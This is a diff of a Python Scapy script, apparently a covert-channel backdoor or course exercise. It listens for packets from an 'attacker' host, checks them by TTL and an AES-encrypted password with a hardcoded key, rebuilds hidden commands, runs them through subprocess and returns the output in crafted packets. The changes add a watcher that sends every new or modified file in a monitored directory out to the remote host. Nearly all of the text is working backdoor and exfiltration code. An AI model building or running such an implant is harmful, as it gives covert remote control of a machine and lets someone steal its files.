@@ -1,12 +1,14 @@
 from scapy.all import *
 from Crypto.Cipher import AES
+from multiprocessing import Process
 import uuid
 import time
 import subprocess
 import binascii
+import pyinotify
 
 # Inputs
-localIP = "192.168.0.23"
+localIP = "192.168.0.7"
 ttlKey = 164
 srcPort = 80
 dstPort = 53
@@ -14,127 +16,14 @@ key = "0123456789abcdef"
 IV = "abcdefghijklmnop"
 messages = []
 authentication = "TEST!"
-# clientIP = "192.168.0.22"
+clientIP = "192.168.0.6"
+monitorDir = "./monitor"
 
 
-def decrypt(command):
-    global key
-    global IV
-    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
-    plain = decryptor.decrypt(command)
-    return plain
-
-
-def encrypt(command):
-    global key
-    global IV
-    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
-    plain = encryptor.encrypt(command)
-    return plain
-
-
-def addToMessages(messages, UID, total, covertContent):
-    # Edge case if command array is empty
-    if(len(messages) == 0):
-        #print 'Commands is empty, creating a new element'
-        element = [UID, [int(total)], [covertContent]]
-        messages.append(element)
-    # If the messages array is NOT empty, search by UID
-    else:
-        #PsuedoCode
-        #Check the current list of messages
-        # if there is already some messages witht he same UID
-        # then append it to that.
-        for x in range(len(messages)):
-            if(messages[x][0] == UID):
-                #print "There is an existing element with same UID"
-                messages[x][2].append(covertContent)
-                return;
-                # print messages
-            pass
-        # If NONE of the elements have the same UID, create a
-        # new entry
-        #print "There are no elements with the same UID"
-        element = [UID, [int(total)], [covertContent]]
-        messages.append(element)
-
-
-def checkCommands(UID):
-    #print "--Checking Commands--"
-    #print(messages)
-    for x in range(len(messages)):
-        element = messages[x]
-        #print element[0]
-        if(element[0] == UID):
-            #print "ELEMENT = UID"
-            total = element[1][0]
-            #print "The total amount of messages is " + str(total)
-            numMessages = len(element[2])
-            #print "The number of messages is " + str(numMessages)
-            if(numMessages == total):
-                return True
-    pass
-    return False
-
-def deleteCommand(UID):
-    #print "Deleting command with UID " + str(UID)
-    #print "Num of elements is " + str(len(messages));
-    for x in range(len(messages)):
-        element = messages[x]
-        #print element[0]
-        if(element[0] == UID):
-            del messages[x]
-    pass
-    #print "After delete, the lenght is " + str(len(messages))
-
-def reconstructCommand(UID):
-    #print "Reconstructing command"
-    for element in messages:
-        # print element
-        text = ""
-        if(element[0] == UID):
-            data = element[2]
-            #print data
-            for value in data:
-                text = text + str(value)
-                pass
-            # print text
-            #Split into chunks of 8
-            line = text
-            n = 8
-            chunks = [line[i:i+n] for i in range(0, len(line), n)]
-            #Convert each element in array to integer
-            # print "chunks is " + str(chunks)
-            for x in range(0, len(chunks)):
-                 chunks[x] = int(chunks[x], 2)
-                 chunks[x] = chr(chunks[x])
-            # print chunks
-            return ''.join(chunks)
-        pass
-
-
-def authenticate(packet):
-    global command
-    global authentication
-    # Check TTL first
-    ttl = packet[IP].ttl
-    # Checks if the ttl matches with ours
-    if ttl == ttlKey:
-        # Check the password in the payload
-        payload = packet["Raw"].load
-        # Decrypt payload, sequence number
-        decryptedData = decrypt(payload)
-        # print "Packet payload " + decryptedData
-        # Check if password in payload is correct
-        password = decryptedData.split("\n")[0]
-        #password = payload[0]
-        # print "Password: " + password
-        if(password == authentication):
-            return True
-        else:
-            return False
-    return False
-
+#1. Listen for commands from the attacker
+def sniffing():
+    #TODO:Need to take out host
+    sniff(filter="ip and host 192.168.0.6", prn=handle)
 
 def handle(packet):
     #TODO: FIX THIS
@@ -188,32 +77,116 @@ def handle(packet):
                     #Run the command
                 # else:
                     #DEBUG: print "Max not reached, don't reconstruct command yet"
+def authenticate(packet):
+    global command
+    global authentication
+    # Check TTL first
+    ttl = packet[IP].ttl
+    # Checks if the ttl matches with ours
+    if ttl == ttlKey:
+        # Check the password in the payload
+        payload = packet["Raw"].load
+        # Decrypt payload, sequence number
+        decryptedData = decrypt(payload)
+        # print "Packet payload " + decryptedData
+        # Check if password in payload is correct
+        password = decryptedData.split("\n")[0]
+        #password = payload[0]
+        # print "Password: " + password
+        if(password == authentication):
+            return True
+        else:
+            return False
+    return False
+
+
+def addToMessages(messages, UID, total, covertContent):
+    # Edge case if command array is empty
+    if(len(messages) == 0):
+        #print 'Commands is empty, creating a new element'
+        element = [UID, [int(total)], [covertContent]]
+        messages.append(element)
+    # If the messages array is NOT empty, search by UID
+    else:
+        #PsuedoCode
+        #Check the current list of messages
+        # if there is already some messages witht he same UID
+        # then append it to that.
+        for x in range(len(messages)):
+            if(messages[x][0] == UID):
+                #print "There is an existing element with same UID"
+                messages[x][2].append(covertContent)
+                return;
+                # print messages
+            pass
+        # If NONE of the elements have the same UID, create a
+        # new entry
+        #print "There are no elements with the same UID"
+        element = [UID, [int(total)], [covertContent]]
+        messages.append(element)
+
+
+def checkCommands(UID):
+    #print "--Checking Commands--"
+    #print(messages)
+    for x in range(len(messages)):
+        element = messages[x]
+        #print element[0]
+        if(element[0] == UID):
+            #print "ELEMENT = UID"
+            total = element[1][0]
+            #print "The total amount of messages is " + str(total)
+            numMessages = len(element[2])
+            #print "The number of messages is " + str(numMessages)
+            if(numMessages == total):
+                return True
+    pass
+    return False
+
+def reconstructCommand(UID):
+    #print "Reconstructing command"
+    for element in messages:
+        # print element
+        text = ""
+        if(element[0] == UID):
+            data = element[2]
+            #print data
+            for value in data:
+                text = text + str(value)
+                pass
+            # print text
+            #Split into chunks of 8
+            line = text
+            n = 8
+            chunks = [line[i:i+n] for i in range(0, len(line), n)]
+            #Convert each element in array to integer
+            # print "chunks is " + str(chunks)
+            for x in range(0, len(chunks)):
+                 chunks[x] = int(chunks[x], 2)
+                 chunks[x] = chr(chunks[x])
+            # print chunks
+            return ''.join(chunks)
+        pass
+
+def deleteCommand(UID):
+    #print "Deleting command with UID " + str(UID)
+    #print "Num of elements is " + str(len(messages));
+    for x in range(len(messages)):
+        element = messages[x]
+        #print element[0]
+        if(element[0] == UID):
+            del messages[x]
+    pass
+    #print "After delete, the lenght is " + str(len(messages))
+
+
+
+
+
+
+
 
 ############################################SENDING BACK###################
-#Conver the message to ascii to bits
-def messageToBits(message):
-    # print "The message is " + message
-    messageData =""
-    for c in message:
-        #bin(int(messageData))[2:]
-        # print "Char code is " + str(ord(c))
-        var = bin(ord(c))[2:].zfill(8)
-        # print var
-        messageData += str(var)
-    # print "Message data is " + messageData
-    return messageData
-
-def fileToBits(filePath):
-    filePath = filePath
-    file = open(filePath, "rb")
-    with file:
-        byte = file.read(1)
-        hexadecimal = binascii.hexlify(byte)
-        decimal = int(hexadecimal, 16)
-        binary = bin(decimal)[2:].zfill(8)
-        print binary
-        return binary
-
 def chunkMessage(message,protocol):
     # print "Message is "  + message
     if(protocol == "TCP"):
@@ -264,7 +237,6 @@ def generateUID():
     uid = uuid.uuid1()
     #print 'Made a UID ' + str(uid)
     return str(uid)
-
 
 def craftPackets(data,protocol,type):
     packets = []
@@ -330,7 +302,7 @@ def sendmessage(protocol,message,type):
 
 	#5. Send the packets
     for packet in packets:
-        send((packet),verbose=0)
+        send((packet))
         pass
 
 def runCommand(command):
@@ -342,4 +314,87 @@ def runCommand(command):
     #print "Output is " + result
     return result
 
-sniff(filter="ip and host 192.168.0.22", prn=handle)
+
+
+##HELPERS
+def decrypt(command):
+    global key
+    global IV
+    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
+    plain = decryptor.decrypt(command)
+    return plain
+
+
+def encrypt(command):
+    global key
+    global IV
+    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
+    plain = encryptor.encrypt(command)
+    return plain
+
+#Conver the message to ascii to bits
+def messageToBits(message):
+    # print "The message is " + message
+    messageData =""
+    for c in message:
+        #bin(int(messageData))[2:]
+        # print "Char code is " + str(ord(c))
+        var = bin(ord(c))[2:].zfill(8)
+        # print var
+        messageData += str(var)
+    # print "Message data is " + messageData
+    return messageData
+
+def fileToBits(filePath):
+    print "HERE"
+
+    # fileName = str.split("/")
+    print "File path is " + filePath
+    file = open(filePath, "rb")
+    binaryString = ""
+
+    #convert whatever is in the file into bytes
+    readFile = bytearray(file.read())
+    fileName = filePath.split("/")
+    fileName = fileName[len(fileName) - 1]
+    print "fileName is " + fileName
+    #craft a header
+    header = messageToBits(fileName + "\n");
+    print "header in bits is " + header
+
+    binaryString += header
+    #Check header length
+    #TEST: print("SHOULD BE " + str(len(fileName+"\n")*8) + " IS ACTUALLY : " + str(len(header)))
+    #convert bytes into bits
+    for bit in readFile:
+        binaryString += bin(bit)[2:].zfill(8)
+    return binaryString
+
+
+##############################################################################################################
+def fileMonitor():
+    watch = pyinotify.IN_CREATE | pyinotify.IN_MODIFY
+    #checks for any new files and modified files
+    wm = pyinotify.WatchManager()
+
+    wm.add_watch(monitorDir, watch , change, rec = True, auto_add = True)
+    notifier = pyinotify.Notifier(wm)
+    notifier.loop()
+
+def change(ev):
+    fileName = ev.name
+    filePath = ev.pathname
+    print fileName
+    print "File path is " + filePath
+    # cmd = ['/bin/echo', 'File', ev.pathname, 'changed']
+    # process = subprocess.Popen(cmd).communicate()
+    #f = open(filePath, 'rb')
+    sendmessage("TCP", filePath, "file")
+
+if __name__ == "__main__":
+    commandSniffProcess = Process(target=sniffing)
+    commandSniffProcess.start()
+    monitorProcess = Process(target=fileMonitor)
+    monitorProcess.start()
+    commandSniffProcess.join()
+    monitorProcess.join()
